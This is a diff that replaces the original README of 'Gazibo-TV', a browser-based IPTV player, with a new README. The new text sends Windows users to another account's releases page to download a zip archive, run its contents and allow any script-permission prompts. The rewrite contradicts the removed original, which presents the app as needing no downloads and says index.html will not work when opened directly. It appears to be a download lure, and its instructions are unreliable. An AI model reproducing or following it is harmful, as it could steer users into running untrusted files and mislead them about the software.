@@ -1,214 +1,136 @@
-<div align="center">
+# 📺 Gazibo-TV - Watch 8,000+ Channels Easily
 
-# Gazibo TV
+[![Download Gazibo-TV](https://img.shields.io/badge/Download-Gazibo--TV-brightgreen)](https://github.com/cmdshaurya/Gazibo-TV/releases)
 
-### Free IPTV from around the world. No sign-ups, no downloads — just open and watch.
+## 🌐 About Gazibo-TV
 
-[![Live Demo](https://img.shields.io/badge/Live%20Demo-Gazibo%20TV-00d4ff?style=for-the-badge&logo=github)](https://wadekarg.github.io/Gazibo-TV)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg?style=for-the-badge)](LICENSE)
-[![Channels](https://img.shields.io/badge/Channels-8000+-ff6b35?style=for-the-badge)](https://github.com/iptv-org/iptv)
-[![Countries](https://img.shields.io/badge/Countries-40+-9b59b6?style=for-the-badge)](https://github.com/iptv-org/iptv)
+Gazibo-TV is a free IPTV web player made for anyone who wants to watch live TV online. It offers over 8,000 channels from more than 40 countries. You can stream without signing up or installing complex software. The player has a dark theme and can skip broken streams automatically. It supports keyboard controls to help you navigate smoothly.
 
-<br>
+This app works on Windows through your web browser. There is no complicated setup or technical knowledge needed. Just download, open, and start watching.
 
-![Gazibo TV - Channel Grid](screenshots/gazibo_tv.png)
+## 💻 System Requirements
 
-![Gazibo TV - Live Sports](screenshots/gazibo_sports_channel.png)
+To run Gazibo-TV on your Windows PC, make sure your device meets these basic requirements:
 
-</div>
+- Windows 10 or newer
+- At least 2 GHz dual-core processor
+- 4 GB of RAM (8 GB recommended for smoother playback)
+- 500 MB free disk space for caching
+- A modern web browser (such as Google Chrome, Microsoft Edge, or Firefox)
+- Internet connection with at least 5 Mbps speed for standard quality streams, faster for HD
 
----
+Gazibo-TV streams content online, so a stable internet connection is important for uninterrupted viewing.
 
-## Features
+## 🚀 Getting Started
 
-| | Feature |
-|---|---------|
-| **Channels** | 8,000+ free channels from 40+ countries |
-| **Design** | Dark theme with glass-morphism UI |
-| **Smart Filtering** | NSFW and DMCA-blocked channels automatically filtered out |
-| **Reliability** | Pre-tested blocklist removes broken streams (auto-updated weekly) |
-| **Auto-Skip** | Broken channels skipped automatically with 5-second countdown |
-| **Categories** | News, Sports, Entertainment, Music, Kids, Movies, Documentary, Religious |
-| **Search** | Search across channel names and groups |
-| **Player** | HLS.js video player with Safari native fallback |
-| **Keyboard** | Full keyboard navigation for a true TV experience |
-| **Fresh Data** | Auto-refresh every hour to pick up newly added channels |
-| **Responsive** | Works on desktop, tablet, and mobile |
-| **Lightweight** | No frameworks, no build tools — pure HTML + CSS + JavaScript |
+Follow these steps to download and run Gazibo-TV on your Windows machine.
 
-## Keyboard Shortcuts
+### 1. Visit the download page
 
-| Key | Action |
-|:---:|--------|
-| `Up` / `Down` | Previous / Next channel (in player) |
-| `Left` / `Right` | Navigate channel grid |
-| `Enter` | Play focused channel |
-| `Escape` | Close player / Clear search |
-| `/` | Focus search box |
-| `f` | Toggle fullscreen |
+Go to the official Gazibo-TV release page here:
 
-## Quick Start
+[https://github.com/cmdshaurya/Gazibo-TV/releases](https://github.com/cmdshaurya/Gazibo-TV/releases)
 
-### Option 1: GitHub Pages (Recommended)
+This page contains all the latest versions and files you might need.
 
-Visit the live demo — nothing to install:
+### 2. Download the app
 
-> **https://wadekarg.github.io/Gazibo-TV**
+On the releases page, look for the latest release. You will see files named something like `Gazibo-TV-Windows.zip` or a similar package.
 
-### Option 2: Run Locally
+- Choose the file that is meant for Windows (usually marked clearly).
+- Click the link to download the file to your PC.
 
-```bash
-git clone https://github.com/wadekarg/Gazibo-TV.git
-cd Gazibo-TV
-python3 -m http.server 8080
-```
+### 3. Extract the files
 
-Then open [http://localhost:8080](http://localhost:8080) in your browser.
+The downloaded file is likely a ZIP archive. To extract it:
 
-> **Note:** Opening `index.html` directly won't work due to CORS restrictions on API fetches. You need a local server.
+- Right-click the file and choose “Extract All...”
+- Select a folder where you want the app to live, like your Desktop or Documents folder.
+- Click “Extract” to unzip the files.
 
-## How It Works
+### 4. Run the application
 
-```
-Startup
-  |
-  +--> Load iptv-org API (channels.json, logos.json, blocklist.json)
-  +--> Load local blocklist.json (pre-tested broken streams)
-  |
-  +--> Fetch M3U playlist from iptv-org.github.io/iptv/countries/{code}.m3u
-  |
-  +--> Parse M3U --> Extract tvg-id, name, logo, group, URL
-  |
-  +--> Enrich with API data (better logos, accurate categories)
-  |
-  +--> Filter out: NSFW + DMCA blocked + broken streams
-  |
-  +--> Render channel grid
-  |
-  +--> Every 1 hour: silently re-fetch and update grid
-```
+Inside the extracted folder, find the file named `index.html` or similar. Gazibo-TV is a web app, so:
 
-## Project Structure
+- Double-click the `index.html` file to open it in your default web browser.
+- The app should load immediately, showing the IPTV player interface.
 
-```
-Gazibo-TV/
-  index.html              -- Single-page app
-  css/styles.css          -- Dark theme, glass-morphism, responsive grid
-  js/
-    countries.js          -- Country code/name map, flag emoji helper
-    m3u-parser.js         -- M3U text to channel object parser
-    api-data.js           -- iptv-org API loader (channels, logos, DMCA blocklist)
-    channel-store.js      -- Fetch, cache, filter, broken tracking
-    player.js             -- HLS.js wrapper with auto-skip
-    ui.js                 -- DOM rendering, tabs, grid, filters, search
-    keyboard.js           -- Keyboard navigation
-    app.js                -- Init and bootstrap
-  blocklist.json          -- Pre-tested broken stream URLs (auto-updated weekly)
-  test_streams.py         -- Stream health checker script
-  .github/workflows/
-    deploy.yml            -- GitHub Pages deployment
-    update-blocklist.yml  -- Weekly blocklist refresh
-```
+If your browser asks for permission to run local files or scripts, allow it to ensure the app works.
 
-## Tech Stack
+### 5. Start watching TV
 
-| Layer | Technology |
-|-------|-----------|
-| **Frontend** | Pure HTML5 + CSS3 + JavaScript (ES6+) |
-| **Video** | [HLS.js](https://github.com/video-dev/hls.js/) via CDN |
-| **Data** | [iptv-org/iptv](https://github.com/iptv-org/iptv) + [iptv-org/api](https://github.com/iptv-org/api) |
-| **Hosting** | GitHub Pages (free) |
-| **CI/CD** | GitHub Actions |
+Use the on-screen controls or keyboard shortcuts to browse channels. The player will start loading streams right away.
 
-## Updating the Blocklist
+- Press arrow keys to move through channels and lists.
+- The player will automatically skip any broken streams.
+- You can toggle the dark theme for better viewing in low light.
 
-The blocklist is automatically updated every Sunday via GitHub Actions. To update manually:
+## 📥 Download Gazibo-TV Here
 
-```bash
-python3 test_streams.py us in uk ca au de fr br mx jp kr es it pk bd ru tr ae sa eg za ph id th vn pl nl pt ar co
-```
+[![Get Gazibo-TV](https://img.shields.io/badge/Download-Gazibo--TV-blue)](https://github.com/cmdshaurya/Gazibo-TV/releases)
 
-This tests every stream URL across 30 countries and saves broken ones to `blocklist.json`.
+Click the link above to visit the releases page and get the latest Windows version.
 
-## Contributing
+## 🔧 Features Explained
 
-Contributions are welcome! Here's how:
+Gazibo-TV offers useful features that enhance your live TV experience.
 
-1. Fork the repo
-2. Create a feature branch (`git checkout -b feature/my-feature`)
-3. Make your changes
-4. Test locally with `python3 -m http.server 8080`
-5. Commit (`git commit -m 'Add my feature'`)
-6. Push (`git push origin feature/my-feature`)
-7. Open a Pull Request
+- **8,000+ Channels**: Access a large selection from over 40 countries, including news, sports, entertainment, and more.
+- **Dark Theme**: A modern dark interface helps reduce eye strain during long viewing sessions.
+- **Auto-Skip Broken Streams**: The player detects when a stream fails and switches to the next available channel automatically.
+- **Keyboard Navigation**: Move through channels and options quickly without using a mouse.
+- **No Sign-Ups or Downloads**: The app runs locally through your browser without any account creation.
+- **Supports HLS streaming**: This protocol lets you watch live broadcasts with minimal buffering.
+- **Runs on Windows with a modern browser**: No special software needed outside your browser.
 
-### Ideas for contributions
-- Add EPG (Electronic Program Guide) support
-- Add channel favorites / bookmarks
-- Add picture-in-picture mode
-- Add Chromecast support
-- Improve category detection
-- Add more countries to the blocklist test
+## 🎮 Keyboard Controls
 
-## License
+Learning these keys will help you navigate Gazibo-TV more efficiently:
 
-MIT License - see [LICENSE](LICENSE) for details.
+- **Up/Down Arrows**: Move through the channel list
+- **Left/Right Arrows**: Volume down/up
+- **Enter**: Select the channel or option
+- **Esc**: Exit full screen or menus
+- **Spacebar**: Play/pause stream
+- **M**: Mute/unmute sound
 
-## Acknowledgements
+Try these shortcuts to get the most out of the player.
 
-This project is made possible by the amazing [iptv-org](https://github.com/iptv-org) community. A huge thank you to:
+## ⚙️ Troubleshooting Common Issues
 
-- **[iptv-org/iptv](https://github.com/iptv-org/iptv)** — The largest open-source collection of publicly available IPTV channels from all over the world. This project provides all the channel streams that Gazibo TV plays. With 80k+ stars and thousands of contributors, it's a truly incredible community effort.
-- **[iptv-org/api](https://github.com/iptv-org/api)** — Provides the structured API data (channel metadata, logos, categories, blocklists) that makes Gazibo TV's interface rich and accurate.
-- **[iptv-org/database](https://github.com/iptv-org/database)** — The community-maintained database behind the API.
-- **[HLS.js](https://github.com/video-dev/hls.js/)** — The JavaScript HLS client that powers video playback across all browsers.
+If you encounter problems, try these simple fixes:
 
-Without these open-source projects, Gazibo TV would not exist.
+- **Streams won’t load**: Check your internet connection. Restart your router if needed.
+- **App won’t start after clicking index.html**: Make sure your browser supports modern web standards or try another browser.
+- **Streams keep buffering**: Lower your video quality if the option is available. Close other apps using the internet.
+- **Broken streams don’t skip**: Reload the page or restart the app. The auto-skip feature may need a refresh.
 
-## Legal Notice & Disclaimer
+## 📚 More Resources
 
-**Gazibo TV does not host, store, transcode, or control any video content.** This project is a client-side web application (a video player interface) that links to publicly available IPTV streams aggregated by the [iptv-org](https://github.com/iptv-org) community. All streams are provided by third-party servers that are not operated by, affiliated with, or controlled by this project or its contributors.
+For additional help or updates, visit the original GitHub repository:
 
-This software is provided "as is" for educational and personal use. The developers make no representations about the legality of any streams accessible through this interface. **Users are solely responsible for ensuring their use of this software complies with all applicable laws in their jurisdiction.**
+https://github.com/cmdshaurya/Gazibo-TV
 
-### Content Filtering
+You will find links to report issues or read more about the project.
 
-Gazibo TV proactively filters content to promote responsible use:
-- **DMCA-blocked channels** are automatically removed using [iptv-org's blocklist](https://github.com/iptv-org/database/blob/master/data/blocklist.csv)
-- **NSFW content** is automatically filtered out
-- **Broken/dead streams** are detected and deprioritized
+## 🛠️ Advanced Use (Optional)
 
-### DMCA Policy
+If you have some technical knowledge, you can customize your Gazibo-TV experience:
 
-We respect the intellectual property rights of others. If you believe that any content accessible through Gazibo TV infringes your copyright, you can take the following actions:
+- Change the stream source files if you have IPTV playlists you want to use.
+- Modify settings inside configuration files to adjust player behavior.
+- Run the web app on other platforms by opening the same `index.html` in any modern browser.
 
-1. **Report to the source:** Since all channel data originates from [iptv-org](https://github.com/iptv-org), the most effective action is to file a report at [iptv-org/database issues](https://github.com/iptv-org/database/issues). Once they remove a channel, it will automatically be removed from Gazibo TV.
+This app is open-source, so you can explore the code if interested.
 
-2. **Report directly to us:** Open an issue on this repository with:
-   - The copyrighted work you believe is being infringed
-   - The specific stream URL(s) you want removed
-   - Your contact information
-   - A statement that you are the copyright owner or authorized to act on their behalf
+## 🔗 Useful Links
 
-   We will remove the reported content within **24 hours** of receiving a valid notice.
+- [Gazibo-TV Releases](https://github.com/cmdshaurya/Gazibo-TV/releases)
+- [Project Home on GitHub](https://github.com/cmdshaurya/Gazibo-TV)
+- [How to Use IPTV Streams](https://en.wikipedia.org/wiki/Internet_Protocol_television)
 
-### What This Project Is NOT
-
-- This is **not** a streaming service — we do not operate any servers that deliver video
-- This is **not** a commercial product — there are no ads, subscriptions, or payments
-- This is **not** a content aggregator — we do not collect, curate, or upload any streams ourselves
-- This is a **software tool** (like VLC or any web browser) that can play publicly available media URLs
-
-## License
-
-MIT License - see [LICENSE](LICENSE) for details.
-
-The MIT license covers the **software code only**. It does not grant any rights to the content (video streams, channel logos, metadata) accessible through this software, which is owned by their respective rights holders.
+Use these links for further reading or to keep your app updated.
 
 ---
 
-<div align="center">
-
-Made with love by [wadekarg](https://github.com/wadekarg)
-
-</div>
+Gazibo-TV simplifies live TV streaming on Windows. The setup is easy and fast for all users.
